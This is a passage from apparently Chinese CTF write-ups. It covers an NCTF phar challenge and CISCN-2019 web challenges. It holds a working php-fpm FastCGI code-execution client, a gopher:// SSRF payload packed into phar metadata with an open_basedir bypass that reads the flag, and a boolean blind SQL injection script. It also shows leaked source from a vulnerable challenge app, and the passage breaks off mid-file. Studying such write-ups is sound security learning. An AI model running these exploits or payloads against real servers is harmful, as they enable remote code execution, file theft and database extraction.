FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php echo "PWNed";?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    parser.add_argument(<span class="string">'-e'</span>, <span class="string">'--ext'</span>, help=<span class="string">'ext absolute path'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-if'</span>, <span class="string">'--include_file'</span>, help=<span class="string">'evil.php absolute path'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--url_format'</span>, help=<span class="string">'generate gopher stream in url format'</span>, nargs=<span class="string">'?'</span>,const=<span class="number">1</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-b'</span>, <span class="string">'--base64_format'</span>, help=<span class="string">'generate gopher stream in base64 format'</span>, nargs=<span class="string">'?'</span>,const=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(args.code),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.ext <span class="keyword">and</span> args.include_file:</span><br><span class="line">        <span class="comment">#params['PHP_ADMIN_VALUE']='extension = '+args.ext</span></span><br><span class="line">        params[<span class="string">'PHP_ADMIN_VALUE'</span>]=<span class="string">"extension_dir = /var/www/html\nextension = ant.so"</span></span><br><span class="line">        params[<span class="string">'PHP_VALUE'</span>]=<span class="string">'auto_prepend_file = '</span>+args.include_file</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url_format <span class="keyword">and</span> <span class="keyword">not</span> args.base64_format :</span><br><span class="line">        response = client.request(params, args.code)</span><br><span class="line">        print(force_text(response))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = client.gopher(params, args.code)</span><br><span class="line">        <span class="keyword">if</span> args.url_format:</span><br><span class="line">            print(urllib.quote(response))</span><br><span class="line">        <span class="keyword">if</span> args.base64_format:</span><br><span class="line">            print(base64.b64encode(response))</span><br></pre></td></tr></table></figure><p>调用时，依据主机ip修改参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 173.0.168.10 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u</span><br></pre></td></tr></table></figure><p><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/1.PNG" alt="exp"><br>生成的数据流我们再度生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">"gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o=<span class="keyword">new</span> Main();</span><br><span class="line">$p-&gt;setMetadata($o);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>这里自己开始犯了个大错，没有给其带上9000端口.否则我们的gopher数据是发给80端口的。而实际上，我们要打的是监听9000端口的FPM。所以注意paylaod格式的端口与下划线。<br>之后看到<code>phpinfo()</code>会发现又禁掉了系统函数。但是主要的要点在于<code>bypass open_basedir</code>。否则我们的行动会被限制在这层目录。<br>考虑目录逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure><p>直接构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'byc'</span>);chdir(<span class="string">'byc'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure><p>到根目录就可以拿flag了。<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/flag.PNG" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-2019-web部分复现</title>
      <link href="2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>原来国赛就是CISCN……buuoj上题目挺全的，干脆选一些比较有价值的题目复现下：</p><h1 id="Hack-World-盲注"><a href="#Hack-World-盲注" class="headerlink" title="Hack World(盲注)"></a>Hack World(盲注)</h1><p>简单的布尔盲注题，简单FUZZ一下发现是数值型注入。同时过滤了<code>and，or，union</code>空格等等。回显可以判断正误，考虑是布尔盲注。payload直接用if分流即可。空格可以<code>%0a</code>绕过，也可以直接括号括起来(之前总结过)</p><a id="more"></a><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;3de016a6-fb79-4b56-a2fb-ea24bc26083f&#125;</span></span><br><span class="line">url=<span class="string">'http://18733385-8c1b-4df7-88f0-1fb70bb6c05b.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"if(ascii(substr((select%0aflag%0afrom%0aflag),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",1,2)"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="Dropbox-phar反序列化"><a href="#Dropbox-phar反序列化" class="headerlink" title="Dropbox(phar反序列化)"></a>Dropbox(phar反序列化)</h1><p>题目属于php反序列化。感觉国赛的题目确实质量很高，这里的反序列化利用看了源码不少时间才找出利用。赶紧记录下。<br>首先进来注册账号登陆。发现有文件上传点。顺手传个一句话图片马，发现没有过滤。然后提供了对图片的下载与删除功能。此时依次尝试一下，发现下载功能的<code>filename</code>允许任意文件下载，于是直接拿到index.php的源码，接着可以拿到其他关键源码，发现是php反序列化，开始审计。<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_SESSION[<span class="string">'username'</span>]<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;ä¸è½½&lt;/a&gt; / &lt;a href="#" class="delete"&gt;å é¤&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span 